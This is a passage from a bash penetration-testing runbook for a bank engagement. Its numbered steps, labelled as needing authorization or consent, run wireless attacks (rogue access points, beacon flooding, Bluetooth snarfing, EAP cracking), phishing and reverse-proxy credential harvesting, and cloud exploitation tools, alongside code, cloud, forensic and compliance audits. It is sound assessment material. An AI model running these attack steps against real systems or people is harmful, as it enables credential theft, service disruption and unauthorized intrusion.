  { sudo eapmd5pass -r ~/BugX/thuringerbank/04_evidence/capture.pcap -w $BS_WORDLIST ; } 2>&1 | tee -a "$LOG"
fi

# 330. Awareness-test captive portal  (requires consent)
if [ "$DRY_RUN" = "1" ]; then
  skip '330. Awareness-test captive portal'
else
  { sudo wifiphisher -e "$BS_SSID" -p firmware-upgrade-wpa --dnsmasq $BS_IFACE ; } 2>&1 | tee -a "$LOG"
fi

# 331. Rogue AP with a custom portal  (requires consent)
if [ "$DRY_RUN" = "1" ]; then
  skip '331. Rogue AP with a custom portal'
else
  { sudo python3 ghost-phisher.py ; } 2>&1 | tee -a "$LOG"
fi

# 332. Continuous wireless survey and capture  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '332. Continuous wireless survey and capture'
else
  { sudo kismet -c $BS_IFACE --no-ncurses --log-prefix ~/BugX/thuringerbank/02_scanning/kismet --log-types kismet,pcapng ; } 2>&1 | tee -a "$LOG"
fi

# 333. Map the survey results  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '333. Map the survey results'
else
  { giskismet -x ~/BugX/thuringerbank/02_scanning/kismet.netxml -o ~/BugX/thuringerbank/05_reports/wireless_map.kml ; } 2>&1 | tee -a "$LOG"
fi

# 334. 802.11 stress testing  (opt-in heavy)
if [ "$DRY_RUN" = "1" ]; then
  skip '334. 802.11 stress testing'
else
  { sudo mdk3 $BS_IFACE b -f ~/BugX/thuringerbank/scripts/mdk3_blacklist.txt -c $BS_CHANNEL ; } 2>&1 | tee -a "$LOG"
fi

# 335. Bluetooth Low Energy pairing weakness  (opt-in heavy)
if [ "$DRY_RUN" = "1" ]; then
  skip '335. Bluetooth Low Energy pairing weakness'
else
  { crackle -i ~/BugX/thuringerbank/04_evidence/ble_capture.pcap -o ~/BugX/thuringerbank/04_evidence/ble_cracked.pcap ; } 2>&1 | tee -a "$LOG"
fi

# 336. Bluetooth device discovery  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '336. Bluetooth device discovery'
else
  { sudo bluelog -i hci0 -o ~/BugX/thuringerbank/02_scanning/bluelog.txt -n -m ; } 2>&1 | tee -a "$LOG"
fi

# 337. Bluetooth object access testing  (opt-in heavy)
if [ "$DRY_RUN" = "1" ]; then
  skip '337. Bluetooth object access testing'
else
  { bluesnarfer -b $BS_BTADDR -r 1-30 ; } 2>&1 | tee -a "$LOG"
fi

# 338. ZigBee and 802.15.4 testing  (opt-in heavy)
if [ "$DRY_RUN" = "1" ]; then
  skip '338. ZigBee and 802.15.4 testing'
else
  { zbid; zbstumbler -i $BS_RADIO ; } 2>&1 | tee -a "$LOG"
fi

# 339. Software-defined radio capture  (passive)
if [ "$DRY_RUN" = "1" ]; then
  skip '339. Software-defined radio capture'
else
  { rtl_power -f 88M:108M:125k -g 50 -i 10 -e 60 ~/BugX/thuringerbank/04_evidence/fm_scan.csv ; } 2>&1 | tee -a "$LOG"
fi

# 340. Decode pager and utility radio traffic  (opt-in heavy)
if [ "$DRY_RUN" = "1" ]; then
  skip '340. Decode pager and utility radio traffic'
else
  { rtl_fm -f 153.35M -s 22050 | multimon-ng -t raw -a POCSAG512 -a POCSAG1200 -a FLEX -f alpha /dev/stdin | tee ~/BugX/thuringerbank/04_evidence/pager_decode.txt ; } 2>&1 | tee -a "$LOG"
fi

# 341. Cellular base station survey  (passive)
if [ "$DRY_RUN" = "1" ]; then
  skip '341. Cellular base station survey'
else
  { kal -s GSM850 -s GSM900 -s DCS -s PCS -g 40 ; } 2>&1 | tee -a "$LOG"
fi

# 342. Access point fuzzing  (opt-in heavy)
if [ "$DRY_RUN" = "1" ]; then
  skip '342. Access point fuzzing'
else
  { sudo doona -m fuzz -i $BS_BSSID -e -s ; } 2>&1 | tee -a "$LOG"
fi

# ---------------------------------------------------------------- Secure code review & dependency audit
note '[Secure code review & dependency audit] local CPU time on the repository you were given'

# 343. Clone the repository you were authorized to review  (authorized-active)
# PREREQUISITE: export BS_REPO_URL for the repository in scope
if [ "$DRY_RUN" = "1" ]; then
  skip '343. Clone the repository you were authorized to review'
else
  { git clone --depth 200 "$BS_REPO_URL" ~/BugX/thuringerbank/src && git -C ~/BugX/thuringerbank/src log --oneline | head -n 20 ; } 2>&1 | tee -a "$LOG"
fi

# 344. Secret detection across history  (local-only)
if [ "$DRY_RUN" = "1" ]; then
  skip '344. Secret detection across history'
else
  { gitleaks detect --source ~/BugX/thuringerbank/src --report-format json --report-path ~/BugX/thuringerbank/04_evidence/gitleaks.json --redact --verbose ; } 2>&1 | tee -a "$LOG"
fi

# 345. Verified secret detection  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '345. Verified secret detection'
else
  { trufflehog git file://~/BugX/thuringerbank/src --only-verified --json > ~/BugX/thuringerbank/04_evidence/trufflehog.jsonl; wc -l ~/BugX/thuringerbank/04_evidence/trufflehog.jsonl ; } 2>&1 | tee -a "$LOG"
fi

# 346. Pattern-based static analysis  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '346. Pattern-based static analysis'
else
  { semgrep --config auto --config p/owasp-top-ten --json -o ~/BugX/thuringerbank/04_evidence/semgrep.json ~/BugX/thuringerbank/src 2>&1 | tail -n 20 ; } 2>&1 | tee -a "$LOG"
fi

# 347. Python security lint  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '347. Python security lint'
else
  { bandit -r ~/BugX/thuringerbank/src -f json -o ~/BugX/thuringerbank/04_evidence/bandit.json -ll ; } 2>&1 | tee -a "$LOG"
fi

# 348. Custom rules for the bug classes that matter here  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '348. Custom rules for the bug classes that matter here'
else
  { semgrep --config ~/BugX/thuringerbank/scripts/rules/ --json -o ~/BugX/thuringerbank/04_evidence/semgrep_custom.json ~/BugX/thuringerbank/src ; } 2>&1 | tee -a "$LOG"
fi

# 349. Vulnerable JavaScript libraries  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '349. Vulnerable JavaScript libraries'
else
  { retire --path ~/BugX/thuringerbank/src --outputformat json --outputpath ~/BugX/thuringerbank/04_evidence/retire.json --verbose ; } 2>&1 | tee -a "$LOG"
fi

# 350. Node dependency advisories  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '350. Node dependency advisories'
else
  { npm --prefix ~/BugX/thuringerbank/src audit --json > ~/BugX/thuringerbank/04_evidence/npm_audit.json; jq '.metadata.vulnerabilities' ~/BugX/thuringerbank/04_evidence/npm_audit.json ; } 2>&1 | tee -a "$LOG"
fi

# 351. Python dependency advisories  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '351. Python dependency advisories'
else
  { pip-audit -r ~/BugX/thuringerbank/src/requirements.txt --format json --output ~/BugX/thuringerbank/04_evidence/pip_audit.json 2>&1 | tail -n 10 ; } 2>&1 | tee -a "$LOG"
fi

# 352. OWASP dependency-check across the project  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '352. OWASP dependency-check across the project'
else
  { dependency-check.sh --project "yourtarget.com" --scan ~/BugX/thuringerbank/src --format JSON --out ~/BugX/thuringerbank/04_evidence/dependency-check --noupdate ; } 2>&1 | tee -a "$LOG"
fi

# 353. SonarQube analysis of the repository  (authorized-active)
# PREREQUISITE: export BS_SONAR_URL and BS_SONAR_TOKEN
if [ "$DRY_RUN" = "1" ]; then
  skip '353. SonarQube analysis of the repository'
else
  { sonar-scanner -Dsonar.projectKey=yourtarget.com-review -Dsonar.sources=~/BugX/thuringerbank/src -Dsonar.host.url="$BS_SONAR_URL" -Dsonar.login="$BS_SONAR_TOKEN" -Dsonar.qualitygate.wait=true ; } 2>&1 | tee -a "$LOG"
fi

# 354. Commercial SAST via CxConsole  (authorized-active)
# PREREQUISITE: the client's Checkmarx licence and credentials
if [ "$DRY_RUN" = "1" ]; then
  skip '354. Commercial SAST via CxConsole'
else
  { CheckmarxCLI.sh Scan -v -CxServer "$BS_CX_SERVER" -projectName "yourtarget.com-review" -LocationType folder -LocationPath ~/BugX/thuringerbank/src -preset "OWASP Top 10" -ReportPDF ~/BugX/thuringerbank/05_reports/checkmarx.pdf ; } 2>&1 | tee -a "$LOG"
fi

# 355. Commercial SAST via sourceanalyzer  (authorized-active)
# PREREQUISITE: a Fortify licence
if [ "$DRY_RUN" = "1" ]; then
  skip '355. Commercial SAST via sourceanalyzer'
else
  { sourceanalyzer -b yourtarget.com -Xmx4G ~/BugX/thuringerbank/src; sourceanalyzer -b yourtarget.com -scan -f ~/BugX/thuringerbank/05_reports/fortify.fpr ; } 2>&1 | tee -a "$LOG"
fi

# 356. Pipeline scan through the Veracode CLI  (authorized-active)
# PREREQUISITE: a Veracode licence and API credentials
if [ "$DRY_RUN" = "1" ]; then
  skip '356. Pipeline scan through the Veracode CLI'
else
  { veracode pipeline-scan -f ~/BugX/thuringerbank/artifacts/app.jar --fail-on-severity high --verbose --json ~/BugX/thuringerbank/04_evidence/veracode.json ; } 2>&1 | tee -a "$LOG"
fi

# 357. AppScan Source static analysis  (authorized-active)
# PREREQUISITE: an AppScan Source licence
if [ "$DRY_RUN" = "1" ]; then
  skip '357. AppScan Source static analysis'
else
  { appscan.sh prepare -s ~/BugX/thuringerbank/src -d ~/BugX/thuringerbank/04_evidence/appscan_prep --verbose ; } 2>&1 | tee -a "$LOG"
fi

# 358. Third-party dependency and container check  (authorized-active)
# PREREQUISITE: a Snyk token
if [ "$DRY_RUN" = "1" ]; then
  skip '358. Third-party dependency and container check'
else
  { snyk test --all-projects --severity-threshold=high --json > ~/BugX/thuringerbank/04_evidence/snyk.json ; } 2>&1 | tee -a "$LOG"
fi

# ---------------------------------------------------------------- Cloud, container & Kubernetes
note '[Cloud, container & Kubernetes] API calls against your own tenant credentials, not against the target'

# 359. Confirm which identity your credentials are  (authorized-active)
# PREREQUISITE: read-only credentials the client issued for the review
if [ "$DRY_RUN" = "1" ]; then
  skip '359. Confirm which identity your credentials are'
else
  { aws sts get-caller-identity; aws iam list-users --max-items 20 --output table ; } 2>&1 | tee -a "$LOG"
fi

# 360. Enumerate the publicly exposed surface  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '360. Enumerate the publicly exposed surface'
else
  { aws s3api list-buckets --query 'Buckets[].Name' --output text | tr '\t' '\n' | while read b; do printf '%s ' "$b"; aws s3api get-bucket-acl --bucket "$b" --query 'Grants[?Grantee.URI!=null].Permission' --output text; done ; } 2>&1 | tee -a "$LOG"
fi

# 361. Multi-cloud security assessment  (passive)
if [ "$DRY_RUN" = "1" ]; then
  skip '361. Multi-cloud security assessment'
else
  { prowler aws -M json-ocsf -o ~/BugX/thuringerbank/02_scanning/prowler -F check11,12 ~/BugX/thuringerbank/02_scanning/prowler_report ; } 2>&1 | tee -a "$LOG"
fi

# 362. Cloud configuration review  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '362. Cloud configuration review'
else
  { scout aws --report-dir ~/BugX/thuringerbank/02_scanning/scoutsuite --no-browser ; } 2>&1 | tee -a "$LOG"
fi

# 363. Authorized cloud exploitation checks  (opt-in heavy)
if [ "$DRY_RUN" = "1" ]; then
  skip '363. Authorized cloud exploitation checks'
else
  { pacu --session yourtarget.com --exec "run iam__enum_permissions; run iam__enum_users_roles_policies_groups" ; } 2>&1 | tee -a "$LOG"
fi

# 364. Situational awareness across the tenant  (passive)
if [ "$DRY_RUN" = "1" ]; then
  skip '364. Situational awareness across the tenant'
else
  { cloudfox aws --profile default all-checks -o ~/BugX/thuringerbank/02_scanning/cloudfox ; } 2>&1 | tee -a "$LOG"
fi

# 365. Azure attack-path collection  (authorized-active)
# PREREQUISITE: export BS_AZ_USER, BS_AZ_PASS and BS_AZ_TENANT
if [ "$DRY_RUN" = "1" ]; then
  skip '365. Azure attack-path collection'
else
  { azurehound -u "$BS_AZ_USER" -p "$BS_AZ_PASS" -t "$BS_AZ_TENANT" list --output ~/BugX/thuringerbank/03_exploits/azurehound.json ; } 2>&1 | tee -a "$LOG"
fi

# 366. Azure resource and role enumeration  (authorized-active)
# PREREQUISITE: an az login session with read permissions
if [ "$DRY_RUN" = "1" ]; then
  skip '366. Azure resource and role enumeration'
else
  { az account show; az role assignment list --all --include-inherited --output table | head -n 30 ; } 2>&1 | tee -a "$LOG"
fi

# 367. GCP project and IAM review  (authorized-active)
# PREREQUISITE: export BS_GCP_PROJECT and an authorized gcloud session
if [ "$DRY_RUN" = "1" ]; then
  skip '367. GCP project and IAM review'
else
  { gcloud projects list; gcloud projects get-iam-policy "$BS_GCP_PROJECT" --format json | jq '.bindings[] | {role, members}' | head -n 40 ; } 2>&1 | tee -a "$LOG"
fi

# 368. Image and filesystem scanning  (authorized-active)
# PREREQUISITE: export BS_IMAGE for the image in scope
if [ "$DRY_RUN" = "1" ]; then
  skip '368. Image and filesystem scanning'
else
  { trivy image --scanners vuln,secret,misconfig --format json --output ~/BugX/thuringerbank/02_scanning/trivy_image.json "$BS_IMAGE" ; } 2>&1 | tee -a "$LOG"
fi

# 369. Infrastructure-as-code configuration scan  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '369. Infrastructure-as-code configuration scan'
else
  { trivy config --format json --output ~/BugX/thuringerbank/02_scanning/trivy_config.json ~/BugX/thuringerbank/src ; } 2>&1 | tee -a "$LOG"
fi

# 370. Kubernetes exposure discovery  (authorized-active)
# PREREQUISITE: export BS_K8S_HOST and confirm cluster testing is authorized
if [ "$DRY_RUN" = "1" ]; then
  skip '370. Kubernetes exposure discovery'
else
  { kube-hunter --remote $BS_K8S_HOST --report json --log ~/BugX/thuringerbank/04_evidence/kube_hunter.log --include passive ; } 2>&1 | tee -a "$LOG"
fi

# 371. Cluster configuration audit  (authorized-active)
# PREREQUISITE: cluster manifests or a kubeconfig for the review
if [ "$DRY_RUN" = "1" ]; then
  skip '371. Cluster configuration audit'
else
  { kubeaudit all -f ~/BugX/thuringerbank/src/k8s -r ~/BugX/thuringerbank/05_reports/kubeaudit.txt ; } 2>&1 | tee -a "$LOG"
fi

# 372. What the credentials you were given can do  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '372. What the credentials you were given can do'
else
  { kubectl auth can-i --list; kubectl get pods --all-namespaces -o wide | head -n 30 ; } 2>&1 | tee -a "$LOG"
fi

# 373. Score the manifests for risk  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '373. Score the manifests for risk'
else
  { kubesec scan ~/BugX/thuringerbank/src/k8s/*.yaml | jq '.[] | {file: .fileName, score: .score}' ; } 2>&1 | tee -a "$LOG"
fi

# 374. Docker host security baseline  (passive)
if [ "$DRY_RUN" = "1" ]; then
  skip '374. Docker host security baseline'
else
  { docker-bench-security -l ~/BugX/thuringerbank/05_reports/docker_bench.log -c container_images,host_configuration ; } 2>&1 | tee -a "$LOG"
fi

# 375. Infrastructure-as-code policy scanning  (passive)
if [ "$DRY_RUN" = "1" ]; then
  skip '375. Infrastructure-as-code policy scanning'
else
  { checkov -d ~/BugX/thuringerbank/src -o json --output-file-path ~/BugX/thuringerbank/02_scanning/checkov.json --compact ; } 2>&1 | tee -a "$LOG"
fi

# ---------------------------------------------------------------- Forensics, IR & evidence handling
note '[Forensics, IR & evidence handling] mostly local processing time on artefacts you already captured'

# 376. Capture a full session for later reconstruction  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '376. Capture a full session for later reconstruction'
else
  { sudo tcpdump -i eth0 -nn -s0 -w ~/BugX/thuringerbank/04_evidence/session.pcap host yourtarget.com ; } 2>&1 | tee -a "$LOG"
fi

# 377. Extract the streams and objects from the capture  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '377. Extract the streams and objects from the capture'
else
  { tshark -r ~/BugX/thuringerbank/04_evidence/session.pcap -q -z follow,tcp,ascii,0 -z io,stat,1 | head -n 60 ; } 2>&1 | tee -a "$LOG"
fi

# 378. Passive forensic reconstruction  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '378. Passive forensic reconstruction'
else
  { echo "NetworkMiner: open the pcap, use the Files and Credentials tabs, export each artefact to the evidence folder with its hash." ; } 2>&1 | tee -a "$LOG"
fi

# 379. Protocol reconstruction from a capture  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '379. Protocol reconstruction from a capture'
else
  { echo "Xplico: import the pcap, run the reconstruction, then export each reconstructed mail, HTTP and VoIP object." ; } 2>&1 | tee -a "$LOG"
fi

# 380. File carving from an image or capture  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '380. File carving from an image or capture'
else
  { foremost -t jpg,pdf,doc,xls,zip -i ~/BugX/thuringerbank/04_evidence/disk.img -o ~/BugX/thuringerbank/04_evidence/foremost ; } 2>&1 | tee -a "$LOG"
fi

# 381. Feature extraction across an image  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '381. Feature extraction across an image'
else
  { bulk_extractor -o ~/BugX/thuringerbank/04_evidence/bulk_out -e email -e url -e ccn -e telephone ~/BugX/thuringerbank/04_evidence/disk.img ; } 2>&1 | tee -a "$LOG"
fi

# 382. Filesystem timeline from an image  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '382. Filesystem timeline from an image'
else
  { mmls ~/BugX/thuringerbank/04_evidence/disk.img; fls -r -m / -o OFFSET ~/BugX/thuringerbank/04_evidence/disk.img > ~/BugX/thuringerbank/04_evidence/bodyfile.txt; mactime -b ~/BugX/thuringerbank/04_evidence/bodyfile.txt -d > ~/BugX/thuringerbank/04_evidence/timeline.csv ; } 2>&1 | tee -a "$LOG"
fi

# 383. GUI review of the image and timeline  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '383. GUI review of the image and timeline'
else
  { autopsy ; } 2>&1 | tee -a "$LOG"
fi

# 384. Memory analysis of an acquired image  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '384. Memory analysis of an acquired image'
else
  { vol -f ~/BugX/thuringerbank/04_evidence/memory.raw windows.pslist | head -n 40; vol -f ~/BugX/thuringerbank/04_evidence/memory.raw windows.netscan | tee ~/BugX/thuringerbank/04_evidence/netscan.txt | head -n 40 ; } 2>&1 | tee -a "$LOG"
fi

# 385. Build a super-timeline across every artefact  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '385. Build a super-timeline across every artefact'
else
  { log2timeline.py --storage-file ~/BugX/thuringerbank/04_evidence/timeline.plaso ~/BugX/thuringerbank/04_evidence/disk.img; psort.py -o l2tcsv -w ~/BugX/thuringerbank/05_reports/supertimeline.csv ~/BugX/thuringerbank/04_evidence/timeline.plaso "date > '2026-01-01'" ; } 2>&1 | tee -a "$LOG"
fi

# 386. Scan artefacts against your own rules  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '386. Scan artefacts against your own rules'
else
  { yara -r ~/BugX/thuringerbank/scripts/rules.yar ~/BugX/thuringerbank/04_evidence/ | tee ~/BugX/thuringerbank/04_evidence/yara_hits.txt ; } 2>&1 | tee -a "$LOG"
fi

# 387. Metadata across every captured artefact  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '387. Metadata across every captured artefact'
else
  { exiftool -r -csv ~/BugX/thuringerbank/04_evidence > ~/BugX/thuringerbank/04_evidence/exif.csv; head -n 5 ~/BugX/thuringerbank/04_evidence/exif.csv ; } 2>&1 | tee -a "$LOG"
fi

# 388. Hash every artefact for the custody record  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '388. Hash every artefact for the custody record'
else
  { find ~/BugX/thuringerbank/04_evidence -type f -exec sha256sum {} + | tee ~/BugX/thuringerbank/05_reports/evidence_manifest.txt | wc -l ; } 2>&1 | tee -a "$LOG"
fi

# ---------------------------------------------------------------- Social engineering & awareness testing
note '[Social engineering & awareness testing] campaign duration — hours to days, not minutes'

# 389. Credential-harvesting simulation with SET  (requires consent)
if [ "$DRY_RUN" = "1" ]; then
  skip '389. Credential-harvesting simulation with SET'
else
  { sudo setoolkit ; } 2>&1 | tee -a "$LOG"
fi

# 390. Run a structured phishing simulation  (requires consent)
if [ "$DRY_RUN" = "1" ]; then
  skip '390. Run a structured phishing simulation'
else
  { ./gophish ; } 2>&1 | tee -a "$LOG"
fi

# 391. Drive a campaign through its API  (requires consent)
# PREREQUISITE: export BS_GOPHISH_KEY from your own Gophish instance
if [ "$DRY_RUN" = "1" ]; then
  skip '391. Drive a campaign through its API'
else
  { curl -sS -k -X POST "https://127.0.0.1:3333/api/campaigns/" -H "Authorization: $BS_GOPHISH_KEY" -H 'Content-Type: application/json' -d '{"name":"bs-awareness","template":{"name":"t"},"page":{"name":"p"},"smtp":{"name":"s"},"launch_date":"2026-01-01T09:00:00Z","groups":[{"name":"pilot"}]}' ; } 2>&1 | tee -a "$LOG"
fi

# 392. Reverse-proxy awareness test  (requires consent)
if [ "$DRY_RUN" = "1" ]; then
  skip '392. Reverse-proxy awareness test'
else
  { sudo evilginx2 -p ~/BugX/thuringerbank/scripts/phishlets ; } 2>&1 | tee -a "$LOG"
fi

# 393. Simulation with detailed per-page tracking  (requires consent)
if [ "$DRY_RUN" = "1" ]; then
  skip '393. Simulation with detailed per-page tracking'
else
  { king-phisher-server ; } 2>&1 | tee -a "$LOG"
fi

# 394. Commercial awareness platform campaign  (requires consent)
if [ "$DRY_RUN" = "1" ]; then
  skip '394. Commercial awareness platform campaign'
else
  { echo "LUCY: configure the scenario in the licensed appliance, import the consenting participant list, launch, then export the awareness report." ; } 2>&1 | tee -a "$LOG"
fi

# 395. Templated simulation for a small pilot  (requires consent)
if [ "$DRY_RUN" = "1" ]; then
  skip '395. Templated simulation for a small pilot'
else
  { sudo python3 phishing-frenzy.py ; } 2>&1 | tee -a "$LOG"
fi

# 396. Mail-flow and header behaviour testing  (requires consent)
if [ "$DRY_RUN" = "1" ]; then
  skip '396. Mail-flow and header behaviour testing'
else
  { swaks --to "$BS_USER" --from "security@yourtarget.com" --server $BS_SMTP --header "Subject: awareness test" --body "Authorized awareness test message." --add-header "X-BugStrike-Test: 1" ; } 2>&1 | tee -a "$LOG"
fi

# 397. Mailbox naming-convention review  (opt-in heavy)
if [ "$DRY_RUN" = "1" ]; then
  skip '397. Mailbox naming-convention review'
else
  { smtp-user-enum -M VRFY -U ~/BugX/thuringerbank/01_recon/users.txt -t $BS_SMTP -p 25 -w 20 ; } 2>&1 | tee -a "$LOG"
fi

# 398. Email authentication posture as a finding  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '398. Email authentication posture as a finding'
else
  { dig +short TXT _dmarc.yourtarget.com; dig +short TXT yourtarget.com | grep -i spf; dig +short TXT default._domainkey.yourtarget.com ; } 2>&1 | tee -a "$LOG"
fi

# ---------------------------------------------------------------- Host hardening, ITGC, SOC & compliance
note '[Host hardening, ITGC, SOC & compliance] one pass per host or per control family — the checklists take longest'

# 399. Host hardening audit  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '399. Host hardening audit'
else
  { lynis audit system --quick --no-colors --logfile ~/BugX/thuringerbank/05_reports/lynis.log --report-file ~/BugX/thuringerbank/05_reports/lynis.dat ; } 2>&1 | tee -a "$LOG"
fi

# 400. SCAP benchmark evaluation  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '400. SCAP benchmark evaluation'
else
  { oscap xccdf eval --profile xccdf_org.ssgproject.content_profile_cis --results ~/BugX/thuringerbank/04_evidence/oscap-results.xml --report ~/BugX/thuringerbank/05_reports/oscap.html /usr/share/xml/scap/ssg/content/ssg-ubuntu2204-ds.xml ; } 2>&1 | tee -a "$LOG"
fi

# 401. CIS benchmark assessment (licensed)  (authorized-active)
# PREREQUISITE: a CIS-CAT licence
if [ "$DRY_RUN" = "1" ]; then
  skip '401. CIS benchmark assessment (licensed)'
else
  { echo "CIS-CAT Pro: point it at the host with the benchmark and profile the client requires, then export the assessment report and the remediation list." ; } 2>&1 | tee -a "$LOG"
fi

# 402. File integrity state on the hosts you review  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '402. File integrity state on the hosts you review'
else
  { sudo tripwire --check --twfile /etc/tripwire/tw.cfg --twpol /etc/tripwire/tw.pol | tee ~/BugX/thuringerbank/04_evidence/tripwire.txt | tail -n 30 ; } 2>&1 | tee -a "$LOG"
fi

# 403. Query the host's live state  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '403. Query the host'\''s live state'
else
  { osqueryi --json "SELECT name, version FROM deb_packages WHERE name LIKE 'openssl%'; SELECT * FROM listening_ports WHERE port IN (22,80,443);" > ~/BugX/thuringerbank/04_evidence/osquery.json; head -c 600 ~/BugX/thuringerbank/04_evidence/osquery.json ; } 2>&1 | tee -a "$LOG"
fi

# 404. Check the audit rules actually in place  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '404. Check the audit rules actually in place'
else
  { sudo auditctl -l | tee ~/BugX/thuringerbank/04_evidence/audit_rules.txt | head -n 40 ; } 2>&1 | tee -a "$LOG"
fi

# 405. Nessus scan triggered from the CLI  (authorized-active)
# PREREQUISITE: the client's Nessus licence, policy and scan window
if [ "$DRY_RUN" = "1" ]; then
  skip '405. Nessus scan triggered from the CLI'
else
  { nessuscli scan launch --name "yourtarget.com-review" --policy "Basic Network Scan" --targets "$BS_CIDR" --format pdf --output ~/BugX/thuringerbank/05_reports/nessus.pdf ; } 2>&1 | tee -a "$LOG"
fi

# 406. Qualys scan and report through the API  (authorized-active)
# PREREQUISITE: export BS_QUALYS_USER, BS_QUALYS_PASS, OPTION_ID and SCANNER_ID
if [ "$DRY_RUN" = "1" ]; then
  skip '406. Qualys scan and report through the API'
else
  { curl -sS -u "$BS_QUALYS_USER:$BS_QUALYS_PASS" -X POST -H 'X-Requested-With: curl' -d "action=launch&scan_title=yourtarget.com&ip=$BS_CIDR&option_id=OPTION_ID&iscanner_id=SCANNER_ID" "https://qualysapi.qualys.com/api/2.0/fo/scan/" ; } 2>&1 | tee -a "$LOG"
fi

# 407. Rapid7 scan through its console API  (authorized-active)
# PREREQUISITE: export BS_NEXPOSE and BS_NEXPOSE_TOKEN
if [ "$DRY_RUN" = "1" ]; then
  skip '407. Rapid7 scan through its console API'
else
  { curl -sS -k -X POST "https://$BS_NEXPOSE/api/3/sites/SITE_ID/scans" -H "Authorization: Basic $BS_NEXPOSE_TOKEN" -H 'Content-Type: application/json' -d '{"name":"bs-review"}' ; } 2>&1 | tee -a "$LOG"
fi

# 408. Open-source vulnerability scan  (authorized-active)
# PREREQUISITE: a configured GVM instance and target ids
if [ "$DRY_RUN" = "1" ]; then
  skip '408. Open-source vulnerability scan'
else
  { gvm-cli --gmp-username "$BS_GVM_USER" --gmp-password "$BS_GVM_PASS" socket --socketpath /var/run/gvmd.sock --xml "<create_task><name>yourtarget.com</name><target>BS_TARGET_ID</target><config>CONFIG_ID</config><scanner>SCANNER_ID</scanner></create_task>" ; } 2>&1 | tee -a "$LOG"
fi

# 409. Commercial scanner run  (authorized-active)
# PREREQUISITE: a Retina licence
if [ "$DRY_RUN" = "1" ]; then
  skip '409. Commercial scanner run'
else
  { echo "Retina: run the licensed scanner with the client's policy against the authorised range, then export the report in their template." ; } 2>&1 | tee -a "$LOG"
fi

# 410. SIEM log review with AQL  (authorized-active)
# PREREQUISITE: access to the client's SIEM console
if [ "$DRY_RUN" = "1" ]; then
  skip '410. SIEM log review with AQL'
else
  { echo "QRadar AQL: SELECT sourceip, username, COUNT(*) FROM events WHERE (category=5011 OR category=5012) AND starttime>'24 hours ago' GROUP BY sourceip, username ORDER BY COUNT(*) DESC LAST 24 HOURS" ; } 2>&1 | tee -a "$LOG"
fi

# 411. ArcSight ESM query review  (authorized-active)
# PREREQUISITE: access to the client's ESM console
if [ "$DRY_RUN" = "1" ]; then
  skip '411. ArcSight ESM query review'
else
  { echo "ArcSight ESM: run the authentication and privilege-escalation queries for the window, then export the results and the rule hits that should have fired." ; } 2>&1 | tee -a "$LOG"
fi

# 412. Splunk search for the test window  (authorized-active)
# PREREQUISITE: access to the client's Splunk instance
if [ "$DRY_RUN" = "1" ]; then
  skip '412. Splunk search for the test window'
else
  { echo 'SPL: index=security (EventCode=4625 OR EventCode=4624) earliest=-24h | stats count by src_ip, user | sort -count' ; } 2>&1 | tee -a "$LOG"
fi

# 413. Network monitoring coverage check  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '413. Network monitoring coverage check'
else
  { sudo zeek -i eth0 local LogAscii::use_json=T 2>&1 | tail -n 5; ls -la conn.log dns.log http.log 2>/dev/null ; } 2>&1 | tee -a "$LOG"
fi

# 414. IDS rule coverage and alert review  (passive)
if [ "$DRY_RUN" = "1" ]; then
  skip '414. IDS rule coverage and alert review'
else
  { sudo suricata -i eth0 -c /etc/suricata/suricata.yaml -l ~/BugX/thuringerbank/04_evidence/suricata 2>&1 | tail -n 5 ; } 2>&1 | tee -a "$LOG"
fi

# 415. Endpoint telemetry configuration review  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '415. Endpoint telemetry configuration review'
else
  { echo "Sysmon: verify the config on the reviewed host (Get-Service Sysmon64; sysmon64.exe -c), then replay your test actions and check which generated events." ; } 2>&1 | tee -a "$LOG"
fi

# 416. Config review against the standard, in report form  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '416. Config review against the standard, in report form'
else
  { nipper --input=~/BugX/thuringerbank/04_evidence/running-config.txt --output=~/BugX/thuringerbank/05_reports/nipper-audit.html --format=html --report=network,device ; } 2>&1 | tee -a "$LOG"
fi

# 417. Build the control-evidence checklist for this engagement  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '417. Build the control-evidence checklist for this engagement'
else
